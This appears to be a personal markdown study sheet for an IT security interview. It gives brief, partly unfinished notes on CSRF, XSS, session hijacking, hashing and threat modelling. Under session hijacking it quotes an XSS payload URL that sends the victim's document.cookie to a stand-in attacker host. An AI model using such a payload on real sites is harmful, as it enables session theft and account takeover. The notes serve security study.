# Preparing for IT Security Interview!
## Cybersecurity First-aid
Check JD requirement -> Section titles
### Cross Site Request Forgery (CSRF)
- may require social engineering
- an authenticated users(eg. logged in)
- Trick them into sending a request they didn't want to(eg. sending money, changing password)
- 
### XSS
Conditions:
- User Input 
- Unsantized Dynamic website content sent to users without validation 
#### Stored XSS
- Eg. In forum, log
#### Reflected XSS(non-permanent)
- Has less reach than stored but more common 
Process
- Email with malicious link
- Send a specially crafted request to the website. Can be an error message which do not sanitized fully, or search result
- The website didn't sanitize it and execute malicious code

## Cookie and Session hijacking 
https://www.thesslstore.com/blog/the-ultimate-guide-to-session-hijacking-aka-cookie-hijacking/
- Web servers track users with their session ID to keep a user signing in
- Session fixation
	- bank.com/login?sid=123456
- XSS
	- `http://www.yourbankswebsite.com/search?<script>location.href=’http://www.evilattacker.com/hijacker.php?cookie=’+document.cookie;</script>`
## Hashing
Md5 Sha 256 one way function signature
Password storage check file unedited 
## Symmetric Vs Asymmetric Encryption


## Public Key and Private Key Infrastructure

## OWASP 10
## SANS Top 25
## Threat Modelling
- Stride dread pasta
## SSL Vs TLS
## HTTP Vs HTTPS

Perimeter Protection?

## Authentication Vs Authorization
- former is checking if users are who they claim to be
- latter is giving permission to users